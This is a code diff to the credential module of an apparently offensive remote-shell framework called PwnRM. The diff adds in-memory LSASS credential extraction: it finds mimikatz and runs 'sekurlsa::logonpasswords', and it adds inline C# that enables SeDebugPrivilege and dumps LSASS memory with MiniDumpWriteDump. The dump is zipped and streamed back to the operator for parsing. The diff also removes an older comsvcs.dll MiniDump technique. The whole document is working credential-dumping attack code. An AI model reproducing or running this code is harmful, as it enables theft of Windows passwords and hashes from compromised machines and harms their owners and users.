@@ -1,19 +1,22 @@
 """Credential artifact reconnaissance and explicit current-user DPAPI unprotect."""
 
 import base64
+import os
 import secrets
+import shutil
+import subprocess
 from pathlib import PureWindowsPath
 from typing import List, Any
 
 from . import BaseModule
-from ..core.credential_dump import parse_lsass_minidump, zeroize
+from ..core.credential_dump import extract_zip_artifacts, parse_lsass_minidump, zeroize
 from ..shell.ui import c, M, BLD
 from ..shell.commands import b64str
 
 
 class CredsModule(BaseModule):
     name = "creds"
-    description = "Credential artifact inventory, DPAPI unprotect, and ephemeral LSASS parsing"
+    description = "Credential inventory, DPAPI unprotect, and fast in-memory LSASS extraction"
     author = "uziii2208"
     options = {
         "vault": {"desc": "Enumerate Windows Credential Manager and Vault metadata"},
@@ -21,7 +24,9 @@ class CredsModule(BaseModule):
         "decrypt": {"desc": "Unprotect one Base64 DPAPI blob as the current user: decrypt <B64>"},
         "history": {"desc": "Display recent PowerShell console history"},
         "browser": {"desc": "Locate Chrome, Edge and Brave credential database artifacts"},
-        "lsa": {"desc": "Parse an ephemeral LSASS minidump (administrator/SeDebug required)"},
+        "lsa": {"desc": "Extract LSASS credentials in memory with compact-dump fallback"},
+        "--lsa-executor": {"desc": "Local x64 credential executor PE for the fast in-memory lsa path"},
+        "--lsa-timeout": {"desc": "Timeout in seconds for the in-memory lsa executor (default: 120)"},
         "--lsa-output": {"desc": "Remote temporary path used with lsa; always deleted"},
         "--download": {"desc": "Retain the raw LSASS dump in the local PwnRM loot store"},
     }
@@ -30,6 +35,8 @@ class CredsModule(BaseModule):
         selected = set()
         decrypt_blob = ""
         lsa_output = ""
+        lsa_executor = ""
+        lsa_timeout = 120
         retain_download = False
         idx = 0
         while idx < len(args):
@@ -66,6 +73,26 @@ class CredsModule(BaseModule):
                     return {"status": "error", "error": "invalid LSASS output path"}
                 idx += 2
                 continue
+            if arg == "--lsa-executor":
+                if idx + 1 >= len(args):
+                    shell.write_warning("  [-] --lsa-executor requires a local x64 PE path.")
+                    return {"status": "error", "error": "missing LSASS executor path"}
+                lsa_executor = args[idx + 1]
+                idx += 2
+                continue
+            if arg == "--lsa-timeout":
+                if idx + 1 >= len(args):
+                    shell.write_warning("  [-] --lsa-timeout requires seconds.")
+                    return {"status": "error", "error": "missing LSASS executor timeout"}
+                try:
+                    lsa_timeout = int(args[idx + 1])
+                except ValueError:
+                    lsa_timeout = -1
+                if not 1 <= lsa_timeout <= 3600:
+                    shell.write_warning("  [-] --lsa-timeout must be between 1 and 3600 seconds.")
+                    return {"status": "error", "error": "invalid LSASS executor timeout"}
+                idx += 2
+                continue
             if arg == "--download":
                 retain_download = True
                 idx += 1
@@ -83,9 +110,47 @@ class CredsModule(BaseModule):
         if retain_download and "lsa" not in selected:
             shell.write_warning("  [-] --download is only valid together with the lsa mode.")
             return {"status": "error", "error": "download without lsa mode"}
+        if (lsa_executor or lsa_timeout != 120) and "lsa" not in selected:
+            shell.write_warning("  [-] --lsa-executor/--lsa-timeout require the lsa mode.")
+            return {"status": "error", "error": "LSASS executor option without lsa mode"}
 
         if not selected:
             selected = {"vault", "dpapi", "history", "browser"}
+
+        if selected == {"lsa"} and not lsa_output and not retain_download:
+            explicit_executor = bool(lsa_executor)
+            if not lsa_executor:
+                candidates = [
+                    os.environ.get("PWNRM_LSA_EXECUTOR", ""),
+                    shutil.which("mimikatz.exe") or "",
+                    "/opt/resources/windows/mimikatz/x64/mimikatz.exe",
+                    "/opt/resources/windows/impacket-examples-windows/mimikatz.exe",
+                ]
+                lsa_executor = next(
+                    (candidate for candidate in candidates if candidate and os.path.isfile(candidate)),
+                    "",
+                )
+            if lsa_executor:
+                shell.write_info(
+                    c(M + BLD, f"  [*] Fast LSASS extraction through in-memory executor: {lsa_executor}")
+                )
+                forwarded = [
+                    "native",
+                    "--capture-output",
+                    "--timeout",
+                    str(lsa_timeout),
+                    lsa_executor,
+                    "privilege::debug",
+                    "sekurlsa::logonpasswords",
+                    "exit",
+                ]
+                fast_result = shell.noconsolation(subprocess.list2cmdline(forwarded))
+                if not isinstance(fast_result, dict):
+                    fast_result = {"status": "completed"}
+                fast_result.update({"selected": ["lsa"], "backend": "memory-executor"})
+                if explicit_executor or fast_result.get("status") != "error":
+                    return fast_result
+                shell.write_warning("Fast in-memory LSASS executor failed; falling back to compact minidump.")
 
         if "lsa" in selected and not lsa_output:
             try:
@@ -101,8 +166,10 @@ class CredsModule(BaseModule):
                 return {"status": "error", "error": "unsafe LSASS staging path"}
 
         if "lsa" in selected:
+            archive_path = f"{lsa_output}.zip"
             exists = shell.run_sync(
-                f"Test-Path -LiteralPath '{shell._pse(lsa_output)}'"
+                f"(Test-Path -LiteralPath '{shell._pse(lsa_output)}') -or "
+                f"(Test-Path -LiteralPath '{shell._pse(archive_path)}')"
             ).strip().lower() == "true"
             if exists:
                 shell.write_error(f"  [-] Refusing to overwrite existing remote path: {lsa_output}")
@@ -120,6 +187,7 @@ $doBrowser = __DO_BROWSER__
 $doLsa = __DO_LSA__
 $decryptBlob = '__DECRYPT_BLOB__'
 $lsaOutput = '__LSA_OUTPUT__'
+$lsaArchive = '__LSA_ARCHIVE__'
 
 Write-Host "`n========================================================" -ForegroundColor Cyan
 Write-Host "   PwnRM Credential Artifact Inventory" -ForegroundColor Cyan
@@ -236,7 +304,7 @@ if ($doBrowser) {
 }
 
 if ($doLsa) {
-    Write-Host "`n[LSASS Full Minidump Staging]" -ForegroundColor Yellow
+    Write-Host "`n[LSASS Compact Credential Minidump]" -ForegroundColor Yellow
     $dumpPath = $null
     $previousErrorAction = $ErrorActionPreference
     $ErrorActionPreference = 'Stop'
@@ -255,31 +323,79 @@ if ($doLsa) {
         }
 
         $lsass = Get-Process -Name lsass -ErrorAction Stop | Select-Object -First 1
-        $rundll32 = Join-Path $env:WINDIR 'System32\rundll32.exe'
-        $comsvcs = Join-Path $env:WINDIR 'System32\comsvcs.dll'
-        $comsvcsEntry = $comsvcs + ','
+        $miniDumpSource = @"
+using System;
+using System.ComponentModel;
+using System.IO;
+using System.Runtime.InteropServices;
 
-        # Windows PowerShell's Start-Process joins ArgumentList values into a
-        # single string.  That changes the significant `comsvcs.dll,` token on
-        # some hosts (ERROR_INVALID_NAME).  The call operator preserves each
-        # native argument.  Since rundll32 is a GUI-subsystem binary, track its
-        # exact worker by the unique dump path instead of relying on -Wait.
-        & $rundll32 $comsvcsEntry MiniDump $lsass.Id $dumpPath full
-        $dumpDeadline = [DateTime]::UtcNow.AddSeconds(180)
-        do {
-            $dumpWorkers = @(
-                Get-CimInstance Win32_Process -Filter "Name = 'rundll32.exe'" -ErrorAction SilentlyContinue |
-                    Where-Object { $_.CommandLine -and $_.CommandLine.Contains($dumpPath) }
-            )
-            if ($dumpWorkers.Count -eq 0) { break }
-            Start-Sleep -Milliseconds 250
-        } while ([DateTime]::UtcNow -lt $dumpDeadline)
-        if ($dumpWorkers.Count -gt 0) {
-            foreach ($worker in $dumpWorkers) {
-                Stop-Process -Id ([int]$worker.ProcessId) -Force -ErrorAction SilentlyContinue
+public static class PwnRMCompactMiniDump {
+    [StructLayout(LayoutKind.Sequential)]
+    private struct LUID { public uint LowPart; public int HighPart; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct TOKEN_PRIVILEGES {
+        public uint PrivilegeCount;
+        public LUID Luid;
+        public uint Attributes;
+    }
+
+    [DllImport("advapi32.dll", SetLastError=true)]
+    private static extern bool OpenProcessToken(IntPtr process, uint access, out IntPtr token);
+    [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
+    private static extern bool LookupPrivilegeValue(string system, string name, out LUID luid);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    private static extern bool AdjustTokenPrivileges(IntPtr token, bool disableAll,
+        ref TOKEN_PRIVILEGES privileges, uint length, IntPtr previous, IntPtr required);
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetCurrentProcess();
+    [DllImport("kernel32.dll", SetLastError=true)]
+    private static extern IntPtr OpenProcess(uint access, bool inherit, uint processId);
+    [DllImport("kernel32.dll")]
+    private static extern bool CloseHandle(IntPtr handle);
+    [DllImport("dbghelp.dll", SetLastError=true)]
+    private static extern bool MiniDumpWriteDump(IntPtr process, uint processId, IntPtr file,
+        uint dumpType, IntPtr exception, IntPtr userStream, IntPtr callback);
+
+    private static void EnableDebugPrivilege() {
+        IntPtr token;
+        if (!OpenProcessToken(GetCurrentProcess(), 0x28, out token))
+            throw new Win32Exception(Marshal.GetLastWin32Error());
+        try {
+            LUID luid;
+            if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
+                throw new Win32Exception(Marshal.GetLastWin32Error());
+            TOKEN_PRIVILEGES privileges = new TOKEN_PRIVILEGES {
+                PrivilegeCount = 1, Luid = luid, Attributes = 2
+            };
+            if (!AdjustTokenPrivileges(token, false, ref privileges, 0, IntPtr.Zero, IntPtr.Zero))
+                throw new Win32Exception(Marshal.GetLastWin32Error());
+        } finally { CloseHandle(token); }
+    }
+
+    public static void Dump(uint processId, string path) {
+        EnableDebugPrivilege();
+        IntPtr process = OpenProcess(0x450, false, processId);
+        if (process == IntPtr.Zero)
+            throw new Win32Exception(Marshal.GetLastWin32Error());
+        try {
+            using (FileStream output = new FileStream(path, FileMode.CreateNew, FileAccess.Write, FileShare.None)) {
+                // Data/code segments plus private RW/WC pages contain the
+                // material pypykatz needs without transferring all LSASS RAM.
+                const uint CompactCredentialDump = 0x00002A01;
+                if (!MiniDumpWriteDump(process, processId,
+                    output.SafeFileHandle.DangerousGetHandle(), CompactCredentialDump,
+                    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
+                    throw new Win32Exception(Marshal.GetLastWin32Error());
             }
-            throw "MiniDump worker timed out after 180 seconds"
+        } finally { CloseHandle(process); }
+    }
+}
+"@
+        if (-not ('PwnRMCompactMiniDump' -as [type])) {
+            Add-Type -TypeDefinition $miniDumpSource -ErrorAction Stop
         }
+        [PwnRMCompactMiniDump]::Dump([uint32]$lsass.Id, $dumpPath)
 
         $dump = Get-Item -LiteralPath $dumpPath -ErrorAction Stop
         if ($dump.Length -le 0) {
@@ -289,18 +405,30 @@ if ($doLsa) {
         Write-Host "  [+] LSASS dump staged : $dumpPath" -ForegroundColor Green
         Write-Host "      Size              : $($dump.Length) bytes" -ForegroundColor Gray
         Write-Host "      SHA-256           : $dumpHash" -ForegroundColor Gray
-        Write-Host "  [*] PwnRM will parse this dump and remove it immediately." -ForegroundColor Cyan
+        Add-Type -AssemblyName System.IO.Compression
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        $archive = [IO.Compression.ZipFile]::Open($lsaArchive, [IO.Compression.ZipArchiveMode]::Create)
+        try {
+            [IO.Compression.ZipFileExtensions]::CreateEntryFromFile(
+                $archive,
+                $dumpPath,
+                [IO.Path]::GetFileName($dumpPath),
+                [IO.Compression.CompressionLevel]::Fastest
+            ) | Out-Null
+        } finally {
+            $archive.Dispose()
+        }
+        $archiveSize = (Get-Item -LiteralPath $lsaArchive -ErrorAction Stop).Length
+        Remove-Item -LiteralPath $dumpPath -Force -ErrorAction Stop
+        Write-Host "  [+] Compressed transfer archive: $archiveSize bytes" -ForegroundColor Green
+        Write-Host "  [*] Raw dump removed; PwnRM will stream, parse, and remove the archive." -ForegroundColor Cyan
     } catch {
         $failure = $_.Exception.Message
-        if ($dumpPath) {
-            Get-CimInstance Win32_Process -Filter "Name = 'rundll32.exe'" -ErrorAction SilentlyContinue |
-                Where-Object { $_.CommandLine -and $_.CommandLine.Contains($dumpPath) } |
-                ForEach-Object {
-                    Stop-Process -Id ([int]$_.ProcessId) -Force -ErrorAction SilentlyContinue
-                }
-        }
         if ($dumpPath -and (Test-Path -LiteralPath $dumpPath)) {
             Remove-Item -LiteralPath $dumpPath -Force -ErrorAction SilentlyContinue
+        }
+        if ($lsaArchive -and (Test-Path -LiteralPath $lsaArchive)) {
+            Remove-Item -LiteralPath $lsaArchive -Force -ErrorAction SilentlyContinue
         }
         Write-Error "LSASS dump failed (administrator/SeDebug required; PPL/EDR may block access): $failure" -ErrorAction Continue
     } finally {
@@ -319,6 +447,7 @@ Write-Host "`n  [*] Credential artifact scan complete." -ForegroundColor Cyan
             "__DO_LSA__": "$true" if "lsa" in selected else "$false",
             "__DECRYPT_BLOB__": decrypt_blob,
             "__LSA_OUTPUT__": lsa_output.replace("'", "''"),
+            "__LSA_ARCHIVE__": archive_path.replace("'", "''") if "lsa" in selected else "",
         }
         for marker, value in replacements.items():
             ps = ps.replace(marker, value)
@@ -333,6 +462,7 @@ Write-Host "`n  [*] Credential artifact scan complete." -ForegroundColor Cyan
             return {"status": "completed", "selected": sorted(selected)}
 
         dump_data = None
+        archive_data = None
         result = {"status": "interrupted"} if interrupted else {"status": "error"}
         try:
             new_errors = getattr(shell, "last_run_errors", [])[error_count:]
@@ -345,8 +475,10 @@ Write-Host "`n  [*] Credential artifact scan complete." -ForegroundColor Cyan
                     "selected": sorted(selected),
                 }
             else:
-                shell.write_info(c(M + BLD, "\n  [*] Streaming LSASS dump into protected operator memory..."))
-                dump_data = shell.read_remote_file(lsa_output)
+                shell.write_info(c(M + BLD, "\n  [*] Streaming compressed LSASS dump..."))
+                archive_data = shell.read_remote_file(archive_path)
+                dump_name = PureWindowsPath(lsa_output).name
+                dump_data = extract_zip_artifacts(archive_data, [dump_name])[dump_name]
                 records = parse_lsass_minidump(dump_data)
                 shell.write_info(c(M + BLD, "\n  [*] Extracted LSASS credential material"))
                 if records:
@@ -383,13 +515,19 @@ Write-Host "`n  [*] Credential artifact scan complete." -ForegroundColor Cyan
         finally:
             if dump_data is not None:
                 zeroize([dump_data])
+            if archive_data is not None:
+                zeroize([archive_data])
             try:
-                cleaned = shell.delete_remote_path(lsa_output)
+                dump_cleaned = shell.delete_remote_path(lsa_output)
+                archive_cleaned = shell.delete_remote_path(archive_path)
+                cleaned = dump_cleaned and archive_cleaned
             except Exception as exc:
                 cleaned = False
                 shell.write_error(f"  [-] Remote LSASS cleanup failed: {exc}")
             if not cleaned:
-                shell.write_error(f"  [-] Remote LSASS dump still requires cleanup: {lsa_output}")
+                shell.write_error(
+                    f"  [-] Remote LSASS staging still requires cleanup: {lsa_output} and/or {archive_path}"
+                )
                 result = {
                     "status": "error",
                     "error": "remote LSASS cleanup failed",
@@ -397,5 +535,5 @@ Write-Host "`n  [*] Credential artifact scan complete." -ForegroundColor Cyan
                     "selected": sorted(selected),
                 }
             else:
-                shell.write_info(c(M, f"  [+] Remote LSASS dump removed: {lsa_output}"))
+                shell.write_info(c(M, f"  [+] Remote LSASS staging removed: {lsa_output} (+ archive)"))
         return result
